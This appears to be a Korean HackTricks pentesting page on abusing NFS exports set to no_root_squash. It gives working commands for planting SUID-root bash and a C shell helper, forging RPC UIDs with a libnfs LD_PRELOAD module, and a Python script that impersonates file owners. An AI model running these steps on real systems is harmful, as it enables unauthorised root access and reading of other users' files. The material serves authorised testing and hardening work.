# NFS No Root Squash Misconfiguration 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## Squashing 기본 정보

NFS AUTH_SYS/AUTH_UNIX를 사용하는 경우, 서버는 각 RPC 요청에 제공된 `uid`와 `gid`를 기준으로 파일 권한을 확인합니다. Kerberos와 같은 다른 보안 flavor는 다른 자격 증명을 사용하며, 서버는 권한을 확인하기 전에 숫자 자격 증명을 매핑할 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: 모든 UID와 GID를 익명 계정으로 매핑합니다. Linux에서는 기본값이 `nobody`(65534)입니다. `no_all_squash`는 root가 아닌 요청에 대한 기본값입니다.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux의 기본 설정으로, UID/GID가 0(root)인 요청을 익명 계정으로 매핑합니다. 다른 UID와 GID는 squash되지 않습니다.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashing을 비활성화하므로 UID/GID가 0인 요청은 서버에서 root로 처리될 수 있습니다.<sup>[[4]](#references)</sup>

접근이 허용된 클라이언트가 **`no_root_squash`**로 설정된 **`/etc/exports`**의 쓰기 가능한 export를 mount할 수 있다면, 해당 클라이언트의 UID/GID 0 요청은 서버의 root 사용자 권한으로 그곳에 파일을 쓸 수 있습니다.<sup>[[4]](#references)</sup>

`root_squash`는 UID/GID 0만 다시 매핑합니다. AUTH_SYS에서는 허용된 클라이언트의 **0이 아닌 숫자 UID/GID**가 서버의 다른 계정과 일치할 수 있습니다. 따라서 클라이언트가 해당 숫자 ID로 파일을 생성할 수 있고 서버가 접근을 허용한다면, root squashing이 적용되어도 쓰기 가능한 export가 사용자 간 경로가 될 수 있습니다. SUID/SGID를 이용한 권한 전환을 시도할 때는 결과 파일의 소유자, 실행 권한, 서버 mount의 `nosuid` 설정, ACL, SELinux 또는 기타 정책도 확인해야 합니다. export 경로, `rw` 옵션 또는 일치하는 숫자만으로는 클라이언트의 접근 허용 여부, export의 활성화 여부, 두 호스트에서 실질적인 ID 매핑이 동일한지를 입증할 수 없습니다. 열거 중에는 `/etc/exports`와 로컬 메타데이터를 수동으로 확인하고, 새 share를 mount하거나 테스트 파일을 생성하지 마세요.<sup>[[4]](#references)[[5]](#references)</sup>

**NFS**에 대한 자세한 내용은 다음을 확인하세요.

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 권한 상승

### Remote Exploit

bash를 사용하는 옵션 1:
- 접근이 허용된 클라이언트에서 root로 쓰기 가능한 export를 mount하고, **`/bin/bash`**를 복사한 뒤 **SUID** 비트를 설정합니다. 그런 다음 `nosuid`를 사용하지 않는 피해자 mount에서 이를 실행합니다.<sup>[[2]](#references)[[4]](#references)</sup>
    - 업로드한 파일의 소유자를 root로 유지하려면 서버에서 **`no_root_squash`**를 사용해야 합니다. root가 squash되는 경우, 다른 계정의 SUID binary를 만들 수 있는 것은 클라이언트가 해당 계정의 숫자 UID/GID로 합법적으로 파일을 생성하거나 소유할 수 있을 때뿐입니다.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2: 컴파일된 C 코드를 사용:
- 허용된 클라이언트에서 디렉터리를 mount하고, SUID 권한을 악용하는 컴파일된 payload를 복사한 다음 **SUID** 비트를 설정하고 victim에서 실행합니다([C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) 참고).
    - 이전과 동일한 제한 사항이 적용됩니다.

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### 로컬 익스플로잇

> [!TIP]
> **내 컴퓨터에서 피해자 컴퓨터로 터널을 만들 수 있다면, 필요한 포트를 터널링해 권한 상승을 악용하는 Remote 버전을 계속 사용할 수 있습니다.**\
> `/etc/exports`에서 export를 피해자의 IP로 제한하는 경우 다음 트릭이 유용합니다. 원격 클라이언트는 export를 마운트할 수 없지만, 로컬 기법은 허용된 호스트에 이미 마운트된 공유를 통해 동작할 수 있습니다.<sup>[[2]](#references)</sup>\
> 이 권한 없는 libnfs 방식에서는 프로세스가 예약되지 않은 source port를 사용할 수 있도록 export의 **`/etc/exports`**에 `insecure` 플래그를 설정해야 합니다. 기본값은 `secure`이지만, 예약된 포트에 바인딩할 수 있는 프로세스에는 이 옵션이 필요하지 않습니다.<sup>[[1]](#references)[[4]](#references)</sup>

### 기본 정보

NFSv3 AUTH_UNIX 클라이언트는 각 호출에 유효 UID, GID, 그룹을 포함하며, 서버는 이를 권한 확인에 사용합니다. 이 로컬 기법은 [libnfs](https://github.com/sahlberg/libnfs)를 통해 RPC 자격 증명을 위조하여 이 모델을 악용합니다. libnfs의 preload 모듈은 NFS 컨텍스트의 UID/GID를 재정의할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### 라이브러리 컴파일

libnfs 예제는 대상 커널에 맞게 조정해야 할 수 있습니다. 여기서 사용한 안내에서는 preload 모듈을 컴파일하기 전에 fallocate 시스템 호출을 주석 처리해야 한다고 설명합니다.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit 수행

이 예제는 shell을 실행하는 작은 C helper를 만든 다음, 이를 공유 디렉터리에 배치하고 NFS context에서 UID 0으로 `ld_nfs.so`를 사용해 SUID-root로 만듭니다.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit 코드를 컴파일합니다:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **UID를 위조해 exploit을 공유 폴더에 올리고 권한을 변경합니다**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **root 권한을 얻기 위해 exploit을 실행합니다**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### 보너스: 은밀한 파일 접근을 위한 NFShell

root access를 얻은 후에는 이 `nfsh.py` 패턴을 사용해 명령을 실행하기 전에 effective UID를 대상 파일의 UID로 설정할 수 있으므로, 소유권을 재귀적으로 변경하지 않고도 파일에 접근할 수 있습니다.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

다음과 같이 실행:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [잘 알려지지 않은 NFS privesc 이야기](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS 버전 3 프로토콜 명세](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
